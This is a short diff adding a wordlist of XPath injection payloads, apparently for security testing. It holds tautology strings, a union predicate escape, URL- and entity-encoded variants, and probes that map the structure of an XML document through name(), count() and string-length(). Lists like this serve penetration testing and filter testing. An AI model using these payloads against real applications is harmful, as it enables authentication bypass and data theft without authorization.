@@ -1,0 +1,12 @@
+# XPath encoding and predicate probes
+' or '1'='1
+' or 1=1 or 'a'='b
+' or count(/*)>0 or 'a'='b
+'] | //* | //*['
+" or "1"="1
+') or ('1'='1
+' and string-length(name(/*))>0 and '1'='1
+%27%20or%20%271%27%3D%271
+&apos; or &apos;1&apos;=&apos;1
+' or contains(name(/*),'') or '1'='2
+' or starts-with(name(/*),'') or '1'='2
